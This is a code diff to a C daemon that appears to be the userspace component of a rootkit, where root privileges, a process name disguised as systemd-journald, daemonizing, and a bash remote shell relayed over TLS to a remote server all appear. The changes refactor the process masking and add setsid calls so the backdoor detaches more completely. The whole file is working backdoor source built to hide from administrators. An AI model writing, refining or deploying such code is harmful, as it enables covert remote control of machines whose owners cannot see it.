@@ -20,9 +20,9 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/prctl.h>
 #include <sys/socket.h>
 #include <sys/un.h>
-#include <sys/prctl.h>
 #include <unistd.h>
 
 #include "crypto.h"
@@ -35,6 +35,15 @@ static unsigned char secret_key[KEY_LEN];
 #ifndef SHELL_SOCK_PATH
 #define SHELL_SOCK_PATH ("/var/run/my_remote_shell")
 #endif
+
+pid_t wrapped_fork(void) {
+    pid_t pid;
+    if ((pid = fork()) == -1) {
+        perror("fork()");
+        exit(EXIT_FAILURE);
+    }
+    return pid;
+}
 
 void run_remote_shell(void) {
     int remote_sock = socket(AF_UNIX, SOCK_STREAM, 0);
@@ -55,15 +64,20 @@ void run_remote_shell(void) {
 
     printf("shell running\n");
 
+    if (wrapped_fork()) {
+        exit(EXIT_SUCCESS);
+    }
+    setsid();
+
     dup2(remote_sock, 0);
     dup2(remote_sock, 1);
     dup2(remote_sock, 2);
 
-    const char *sh[2];
+    const char* sh[2];
     sh[0] = "/bin/bash";
     sh[1] = NULL;
 
-    execve(sh[0], (char * const *) sh, 0);
+    execve(sh[0], (char* const*) sh, 0);
 }
 
 int create_unix_socket(const char* sock_path) {
@@ -97,13 +111,11 @@ int create_remote_socket(void) {
     return remote_sock;
 }
 
-pid_t wrapped_fork(void) {
-    pid_t pid;
-    if ((pid = fork()) == -1) {
-        perror("fork()");
-        exit(EXIT_FAILURE);
-    }
-    return pid;
+void mask_process(char** argv) {
+    const char* process_mask = "/usr/lib/systemd/systemd-journald";
+    memset(argv[0], 0, strlen(argv[0]));
+    strcpy(argv[0], process_mask);
+    prctl(PR_SET_NAME, process_mask, 0, 0);
 }
 
 /*
@@ -121,17 +133,16 @@ pid_t wrapped_fork(void) {
  * encrypt and decrypt are simply unix socket connections
  * TLS socket is a pure forwarder for the kernel module over TLS (since the kernel doesn't do TLS)
  */
-int main(int argc, char **argv) {
-	setuid(0);
-	setgid(0);
-
-    const char *process_mask = "/usr/lib/systemd/systemd-journald";
-	memset(argv[0], 0, strlen(argv[0]));
-	strcpy(argv[0], process_mask);
-	prctl(PR_SET_NAME, process_mask, 0, 0);
+int main(int argc, char** argv) {
+    setuid(0);
+    setgid(0);
+    mask_process(argv);
 
     //Daemonize
-    wrapped_fork();
+    if (wrapped_fork()) {
+        return EXIT_SUCCESS;
+    }
+    setsid();
 
     memset(secret_key, 0xab, KEY_LEN);
 
@@ -161,14 +172,18 @@ int main(int argc, char **argv) {
     int remote_shell_sock = -1;
 
     if (!wrapped_fork()) {
+        setsid();
         run_remote_shell();
     } else {
+        setsid();
         remote_shell_sock = accept(remote_shell_unix, NULL, 0);
         printf("accept %d\n", remote_shell_sock);
     }
 
     if (!wrapped_fork()) {
+        setsid();
         if (!wrapped_fork()) {
+            setsid();
             //Remote shell read and write to remote server
             for (;;) {
                 int size = read(remote_shell_sock, buffer, MAX_PAYLOAD);
@@ -183,6 +198,7 @@ int main(int argc, char **argv) {
                 SSL_write(ssl, buffer, size);
             }
         } else {
+            setsid();
             //Read
             for (;;) {
                 int size = SSL_read(ssl, buffer, MAX_PAYLOAD);
@@ -204,6 +220,7 @@ int main(int argc, char **argv) {
             }
         }
     } else {
+        setsid();
         //Write
         for (;;) {
             int size = read(conn_sock, buffer, MAX_PAYLOAD);
